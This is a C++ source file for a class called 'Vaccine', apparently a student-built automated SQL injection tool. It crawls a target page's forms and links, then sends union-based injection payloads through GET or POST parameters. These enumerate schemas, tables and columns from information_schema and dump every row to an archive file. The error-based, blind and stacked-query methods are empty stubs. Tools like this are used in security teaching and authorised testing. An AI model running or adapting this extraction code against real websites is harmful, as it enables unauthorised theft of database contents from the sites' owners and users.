#include "../../include/class/Vaccine.hpp"

// ===================================================================== //
// ===================================================================== //
// ============================ P U B L I C ============================ //
// ===================================================================== //
// ===================================================================== //

Vaccine::Vaccine()
{
        this->_db_type = ALL;
        this->_url = std::string();
        this->_request_type = std::string();
        this->_headers = std::vector< std::string >();
        this->_archive_file = std::string();

        this->_html = std::string();
        this->_html_doc = NULL;
        this->_gates = std::vector< xmlNode* >();

        this->_databases = std::unordered_map< std::string, std::vector< int > >();
        this->_tables = std::vector< std::unordered_map< std::string, int > >();
        this->_columns = std::vector< std::unordered_map< std::string, int > >();
        this->_values = std::vector< std::vector< std::string > >();
}

Vaccine::Vaccine(
    const short& _db_type,
    const std::string& url,
    const std::string& request_type,
    const std::vector< std::string >& headers,
    const std::string& archive_file)
{
        this->_db_type = _db_type;
        this->_url = url;
        this->_request_type = request_type;
        this->_headers = headers;
        this->_archive_file = archive_file;

        this->_html = std::string();
        this->_html_doc = NULL;
        this->_gates = std::vector< xmlNode* >();

        this->_databases = std::unordered_map< std::string, std::vector< int > >();
        this->_tables = std::vector< std::unordered_map< std::string, int > >();
        this->_columns = std::vector< std::unordered_map< std::string, int > >();
        this->_values = std::vector< std::vector< std::string > >();
}

Vaccine::Vaccine(const Vaccine& other)
{
        *this = other;
}

Vaccine::~Vaccine()
{
        if (this->_html_doc)
        {
                xmlFreeDoc(*this->_html_doc);
                delete this->_html_doc;
        }
}

Vaccine& Vaccine::operator=(const Vaccine& other)
{
        if (this != &other)
        {
                this->_db_type = other._db_type;
                this->_url = other._url;
                this->_request_type = other._request_type;
                this->_headers = other._headers;
                this->_archive_file = other._archive_file;

                this->_html = other._html;
                if (this->_html_doc)
                {
                        xmlFreeDoc(*this->_html_doc);
                        delete this->_html_doc;
                        this->_html_doc = NULL;
                }
                if (other._html_doc)
                        this->_html_doc = new htmlDocPtr(*other._html_doc);
                this->_gates = other._gates;

                this->_databases = other._databases;
                this->_tables = other._tables;
                this->_columns = other._columns;
                this->_values = other._values;
        }
        return *this;
}

// ==================================================== GETTERS
const short& Vaccine::get_db_type() const
{
        return this->_db_type;
}

const std::string& Vaccine::get_url() const
{
        return this->_url;
}

const std::string& Vaccine::get_request_type() const
{
        return this->_request_type;
}

const std::vector< std::string >& Vaccine::get_headers() const
{
        return this->_headers;
}

const std::string& Vaccine::get_archive_file() const
{
        return this->_archive_file;
}

const std::string& Vaccine::get_html() const
{
        return this->_html;
}

const htmlDocPtr* Vaccine::get_html_doc() const
{
        return this->_html_doc;
}

const std::vector< xmlNode* >& Vaccine::get_gates() const
{
        return this->_gates;
}

const std::unordered_map< std::string, std::vector< int > >& Vaccine::get_databases() const
{
        return this->_databases;
}

const std::vector< std::unordered_map< std::string, int > >& Vaccine::get_tables() const
{
        return this->_tables;
}

const std::vector< std::unordered_map< std::string, int > >& Vaccine::get_columns() const
{
        return this->_columns;
}

const std::vector< std::vector< std::string > >& Vaccine::get_values() const
{
        return this->_values;
}

// ==================================================== SETTERS
void Vaccine::set_db_type(const short& db_type)
{
        this->_db_type = db_type;
}

void Vaccine::set_url(const std::string& url)
{
        this->_url = url;
}

void Vaccine::set_request_type(const std::string& request_type)
{
        this->_request_type = request_type;
}

void Vaccine::set_headers(const std::vector< std::string >& headers)
{
        this->_headers = headers;
}

void Vaccine::set_archive_file(const std::string& archive_file)
{
        this->_archive_file = archive_file;
}

// ==================================================== METHODS
bool Vaccine::fetch_data()
{
        if (!this->_fetch_html())
                return false;

        htmlDocPtr html_doc = htmlReadMemory(
            this->_html.c_str(),
            this->_html.size(),
            "noname.html",
            NULL,
            HTML_PARSE_RECOVER | HTML_PARSE_NOERROR | HTML_PARSE_NOWARNING);
        if (!html_doc)
        {
                std::cerr << "[ ERROR ] htmlReadMemory() failed." << std::endl;
                return false;
        }
        if (this->_html_doc)
        {
                xmlFreeDoc(*this->_html_doc);
                delete this->_html_doc;
                this->_html_doc = NULL;
        }
        this->_html_doc = new htmlDocPtr(html_doc);
        if (!this->_html_doc)
        {
                xmlFreeDoc(html_doc);
                xmlCleanupParser();
                std::cerr << "[ ERROR ] new htmlDocPtr() failed." << std::endl;
                return false;
        }
        this->_parse_html(xmlDocGetRootElement(*this->_html_doc));
        xmlCleanupParser();
        return true;
}

void Vaccine::stacked_queries()
{
}

void Vaccine::union_based()
{
        if (!this->_data_check())
                return;
        std::string url;
        std::string offset;
        std::vector< std::string > payloads;
        std::vector< std::string > parameters;
        const std::vector< std::string > excluded = {
            "information_schema",
            "performance_schema",
            "mysql",
            "sys",
        };
        for (const auto& node : this->_gates)
        {
                if (!this->_init_attempt(node, url, parameters))
                        continue;
                std::cout << "[ INFO ] Testing " << url << "..." << std::endl;
                this->_fetch_databases(
                    parameters,
                    payloads,
                    offset,
                    url,
                    excluded);
                for (const auto& db : this->_databases)
                        this->_fetch_tables(
                            parameters,
                            payloads,
                            offset,
                            url,
                            db.first);
                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch_columns(
                                    parameters,
                                    payloads,
                                    offset,
                                    url,
                                    db.first,
                                    tab_index);
                for (const auto& db : this->_databases)
                        for (const auto& tab_index : db.second)
                                this->_fetch_values(
                                    parameters,
                                    payloads,
                                    offset,
                                    url,
                                    db.first,
                                    tab_index);
                if (!this->_databases.empty())
                        this->_save_results(
                            url.substr(0, url.find('?')),
                            parameters,
                            payloads);
                else
                        std::cout << "[ INFO ] Union based SQLi failed on "
                                  << url << "." << std::endl;
                offset.clear();
                payloads.clear();
                parameters.clear();
                this->_databases.clear();
                this->_tables.clear();
                this->_columns.clear();
                this->_values.clear();
        }
}

void Vaccine::error_based()
{
}

void Vaccine::blind_based()
{
}

// ===================================================================== //
// ===================================================================== //
// =========================== P R I V A T E =========================== //
// ===================================================================== //
// ===================================================================== //

// ==================================================== INIT
bool Vaccine::_data_check() const
{
        if (this->_html.empty())
        {
                std::cerr << "[ ERROR ] Please fetch_data() first." << std::endl;
                return false;
        }
        if (this->_gates.empty())
        {
                std::cerr << "[ ERROR ] " << this->_url
                          << " has no managed SQLi entrypoint." << std::endl;
                return false;
        }
        return true;
}

bool Vaccine::_fetch_html()
{
        CURL* curl = curl_easy_init();
        if (!curl)
        {
                std::cerr << "[ ERROR ] curl_easy_init() failed." << std::endl;
                return false;
        }
        this->_html.clear();
        curl_easy_setopt(curl, CURLOPT_URL, this->_url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Vaccine::_curl_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &this->_html);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
                std::cerr << "[ ERROR ] curl: " << curl_easy_strerror(res) << std::endl;
                curl_easy_cleanup(curl);
                return false;
        }
        curl_easy_cleanup(curl);
        return true;
}

void Vaccine::_parse_html(xmlNode* node)
{
        for (node = node; node; node = node->next)
        {
                if (node->type == XML_ELEMENT_NODE)
                {
                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")) ||
                            !xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
                                this->_gates.push_back(node);
                }
                if (node->children)
                        this->_parse_html(node->children);
        }
}

bool Vaccine::_init_attempt(
    const xmlNode* node,
    std::string& url,
    std::vector< std::string >& parameters) const
{
        if (!node || node->type != XML_ELEMENT_NODE)
                return false;

        xmlChar* gate = NULL;
        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
        {
                gate = xmlGetProp(node, reinterpret_cast< const xmlChar* >("action"));
                this->_parse_form(node, parameters);
        }
        else if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
        {
                gate = xmlGetProp(node, reinterpret_cast< const xmlChar* >("href"));
                this->_parse_link(node, parameters);
        }
        if (!gate)
                return false;
        url = this->_url + std::string(reinterpret_cast< char* >(gate));
        xmlFree(gate);
        return true;
}

void Vaccine::_parse_form(
    const xmlNode* node,
    std::vector< std::string >& parameters) const
{
        xmlChar* name = NULL;
        for (xmlNode* child = node->children; child; child = child->next)
        {
                if (child->children)
                        this->_parse_form(child, parameters);

                if (child->type != XML_ELEMENT_NODE ||
                    xmlStrcasecmp(child->name, reinterpret_cast< const xmlChar* >("input")))
                        continue;
                name = xmlGetProp(child, reinterpret_cast< const xmlChar* >("name"));
                if (!name)
                        continue;
                parameters.push_back(std::string(reinterpret_cast< char* >(name)));
                xmlFree(name);
        }
}

void Vaccine::_parse_link(
    const xmlNode* node,
    std::vector< std::string >& parameters) const
{
        xmlChar* href = xmlGetProp(node, reinterpret_cast< const xmlChar* >("href"));
        if (!href)
                return;
        const std::string query(reinterpret_cast< char* >(href));
        const size_t pos = query.find('?');
        if (pos != std::string::npos)
        {
                std::istringstream iss(query.substr(pos + 1));
                std::string parameter;
                while (std::getline(iss, parameter, '&'))
                {
                        size_t delimiter = parameter.find('=');
                        if (delimiter != std::string::npos)
                                parameters.push_back(parameter.substr(0, delimiter));
                }
        }
        xmlFree(href);
}

// ==================================================== PREPARE
void Vaccine::_fetch_databases(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::vector< std::string >& excluded)
{
        short timeout = TIMEOUT;
        std::string payload;
        while (this->_databases.empty() && timeout--)
        {
                payload = "' UNION SELECT " + offset + "schema_name " +
                          "FROM information_schema.schemata-- ";
                payloads.push_back(payload);

                const std::vector< std::string > parameters = this->_fill_parameters(
                    base_parameters,
                    payload);
                const std::vector< std::string > values = this->_parse_response(
                    this->_process(url, parameters));

                if (values.size() == 1 && values[0].empty())
                        break;

                bool is_excluded;
                for (const auto& value : values)
                {
                        is_excluded = false;
                        for (const auto& exclude : excluded)
                                if (value == exclude)
                                        is_excluded = true;
                        if (!is_excluded)
                                this->_databases[value] = std::vector< int >();
                }
                if (this->_databases.empty())
                        offset += "null, ";
        }
}

void Vaccine::_fetch_tables(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::string& db_name)
{
        const std::string payload =
            "' UNION SELECT " + offset + "table_name " +
            "FROM information_schema.tables " +
            "WHERE table_schema='" + db_name + "'-- ";
        payloads.push_back(payload);

        const std::vector< std::string > parameters = this->_fill_parameters(
            base_parameters,
            payload);
        const std::vector< std::string > values = this->_parse_response(
            this->_process(url, parameters));

        if (values.empty())
                return;

        const int size = this->_tables.size();
        this->_tables.push_back(std::unordered_map< std::string, int >());
        for (const auto& value : values)
                this->_tables[size][value] = -1;
        this->_databases[db_name].push_back(size);
}

void Vaccine::_fetch_columns(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::string& db_name,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                payload = "' UNION SELECT " + offset + "column_name " +
                          "FROM information_schema.columns " +
                          "WHERE table_schema='" + db_name + "' " +
                          "AND table_name='" + table.first + "'-- ";
                payloads.push_back(payload);
                const std::vector< std::string > parameters = this->_fill_parameters(
                    base_parameters,
                    payload);
                const std::vector< std::string > values = this->_parse_response(
                    this->_process(url, parameters));

                if (values.empty())
                        return;

                const int size = this->_columns.size();
                this->_columns.push_back(std::unordered_map< std::string, int >());
                for (const auto& value : values)
                        this->_columns[size][value] = -1;
                this->_tables[tab_index][table.first] = size;
        }
}

void Vaccine::_fetch_values(
    const std::vector< std::string >& base_parameters,
    std::vector< std::string >& payloads,
    std::string& offset,
    const std::string& url,
    const std::string& db_name,
    const int& tab_index)
{
        if (tab_index < 0)
                return;
        int index;
        std::string payload;
        for (const auto& table : this->_tables[tab_index])
        {
                index = this->_tables.at(tab_index).at(table.first);
                if (index < 0)
                        continue;
                for (auto& column : this->_columns[index])
                {
                        payload = "' UNION SELECT " + offset + column.first + ' ' +
                                  "FROM " + db_name + '.' + table.first + "-- ";
                        payloads.push_back(payload);
                        const std::vector< std::string > parameters = this->_fill_parameters(
                            base_parameters,
                            payload);
                        const std::vector< std::string > values = this->_parse_response(
                            this->_process(url, parameters));

                        if (values.empty())
                                return;
                        const int size = this->_values.size();
                        this->_values.push_back(std::vector< std::string >());

                        for (const auto& value : values)
                                this->_values[size].push_back(value);
                        this->_columns[index][column.first] = size;
                }
        }
}

std::vector< std::string > Vaccine::_fill_parameters(
    const std::vector< std::string >& old_parameters,
    const std::string& payload) const
{
        std::vector< std::string > new_parameters(old_parameters);
        for (auto& parameter : new_parameters)
                parameter = "\"" + parameter + "\": \"" + payload + "\"";
        return new_parameters;
}

// ==================================================== PROCESS
std::string Vaccine::_process(
    const std::string& url,
    const std::vector< std::string >& parameters) const
{
        std::string buffer;
        CURL* curl = curl_easy_init();
        if (!curl)
        {
                std::cerr << "[ ERROR ] curl_easy_init() failed." << std::endl;
                return buffer;
        }
        struct curl_slist* header_list = curl_slist_append(
            NULL,
            "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, std::string(url).c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Vaccine::_curl_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
        for (const auto& header : this->_headers)
        {
                std::cout << header << std::endl;
                header_list = curl_slist_append(header_list, header.c_str());
        }
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);

        if (this->_request_type == "GET")
                this->_process_get(url, parameters, &curl);
        else if (this->_request_type == "POST")
                this->_process_post(parameters, &curl);

        curl_easy_cleanup(curl);
        curl_slist_free_all(header_list);
        return buffer;
}

void Vaccine::_process_get(
    const std::string& url,
    const std::vector< std::string >& parameters,
    CURL** curl) const
{
        std::string key;
        std::string value;
        std::stringstream ss;
        std::string query = "?";
        char* encoded_value = NULL;
        for (const auto& entry : parameters)
        {
                ss = std::stringstream(entry);
                std::getline(ss, key, ':');
                std::getline(ss, value);

                if (key.size() < 2 || value.size() < 3)
                        continue;
                key = key.substr(1, key.length() - 2);
                value = value.substr(2, value.length() - 3);
                encoded_value = curl_easy_escape(*curl, value.c_str(), 0);
                if (encoded_value)
                {
                        query += key + "=" + std::string(encoded_value) + "&";
                        curl_free(encoded_value);
                }
        }
        query.pop_back();
        std::string payload = url + query;
        curl_easy_setopt(*curl, CURLOPT_URL, payload.c_str());
        CURLcode res = curl_easy_perform(*curl);
        if (res != CURLE_OK)
                std::cerr << "[ ERROR ] curl_easy_perform() failed: "
                          << curl_easy_strerror(res) << std::endl;
}

void Vaccine::_process_post(
    const std::vector< std::string >& parameters,
    CURL** curl) const
{
        std::string payload = "{ ";
        for (const auto& entry : parameters)
                payload += entry + ", ";
        if (payload.size() >= 2)
        {
                payload.pop_back();
                payload.pop_back();
        }
        payload += " }";
        curl_easy_setopt(*curl, CURLOPT_POSTFIELDSIZE, payload.size());
        curl_easy_setopt(*curl, CURLOPT_POSTFIELDS, payload.c_str());
        CURLcode res = curl_easy_perform(*curl);
        if (res != CURLE_OK)
                std::cerr << "[ ERROR ] curl_easy_perform() failed: "
                          << curl_easy_strerror(res) << std::endl;
}

std::vector< std::string > Vaccine::_parse_response(
    const std::string& response) const
{
        std::vector< std::string > values;
        Json::Value entries;
        std::string errors;
        Json::CharReaderBuilder builder;
        std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
        if (!reader->parse(
                response.c_str(),
                response.c_str() + response.size(),
                &entries,
                &errors))
        {
                std::cerr << "[ ERROR ] Could not parse server response." << std::endl;
                return values;
        }
        for (const auto& member : entries.getMemberNames())
        {
                if (!entries[member].isArray())
                        continue;
                if (entries[member].empty())
                        values.push_back(std::string());

                for (const auto& entry : entries[member])
                {
                        for (const auto& key : entry.getMemberNames())
                        {
                                if (entry[key].isNull())
                                        continue;
                                std::string entry_str;
                                try
                                {
                                        entry_str = entry[key].asString();
                                }
                                catch (const std::exception& e)
                                {
                                        entry_str = "NOT_CONVERTIBLE";
                                }
                                values.push_back(entry_str);
                                break;
                        }
                }
                break;
        }
        return values;
}

// ==================================================== SAVE
void Vaccine::_save_results(
    const std::string& url,
    const std::vector< std::string >& parameters,
    const std::vector< std::string > payloads) const
{
        std::ofstream file(this->_archive_file);
        if (!file.is_open())
        {
                std::cerr << "[ ERROR ] Could not open " << this->_archive_file << '.' << std::endl;
                return;
        }
        file << "========================= V A C C I N E =========================" << std::endl
             << "URL: " << url << std::endl
             << "REQUEST TYPE: " << this->_request_type << std::endl;

        if (!this->_headers.empty())
        {
                file << "CUSTOM HEADERS: " << std::endl;
                for (const auto& header : this->_headers)
                        file << "\t" << header << std::endl;
        }

        file << "PARAMETERS: " << std::endl;
        for (const auto& parameter : parameters)
                file << "\t" << parameter << std::endl;

        file << "PAYLOADS:" << std::endl;
        for (const auto& payload : payloads)
                file << "\t\"" << payload << "\"" << std::endl;

        file << "-----------------------------------------------------------------" << std::endl;
        for (const auto& db : this->_databases)
        {
                file << "DATABASE: " << db.first << std::endl;
                for (const auto& tab_index : db.second)
                {
                        if (tab_index < 0)
                                continue;
                        for (const auto& table : this->_tables[tab_index])
                                this->_save_table(file, tab_index, table.first);
                }
        }
        file << "=================================================================" << std::endl
             << std::endl
             << std::endl;
        file.close();
}

void Vaccine::_save_table(
    std::ofstream& file,
    const int& tab_index,
    const std::string& tab_name) const
{
        file << "\tTABLE: " << tab_name << std::endl;
        file << "\t\tCOLUMN: ";
        const int col_index = this->_tables.at(tab_index).at(tab_name);
        if (col_index < 0)
                return;
        std::vector< int > value_indexes;

        size_t count = 0;
        size_t size = this->_columns[col_index].size();
        for (const auto& column : this->_columns[col_index])
        {
                file << column.first;
                if (++count < size)
                        file << ", ";
                value_indexes.push_back(column.second);
        }
        file << std::endl;
        if (value_indexes.empty() || value_indexes[0] < 0)
                return;

        size = value_indexes.size();
        for (size_t i = 0; i < this->_values[value_indexes[0]].size(); ++i)
        {
                file << "\t\t{ ";
                count = 0;
                for (const auto& j : value_indexes)
                {
                        if (i >= this->_values[j].size())
                                file << "NULL";
                        else
                                file << this->_values[j][i];
                        if (++count < size)
                                file << ", ";
                }
                file << " }" << std::endl;
        }
}

// ==================================================== STATICS
size_t Vaccine::_curl_callback(
    char* ptr,
    size_t size,
    size_t nmemb,
    void* buffer)
{
        ((std::string*)buffer)->append((char*)ptr, size * nmemb);
        return size * nmemb;
}
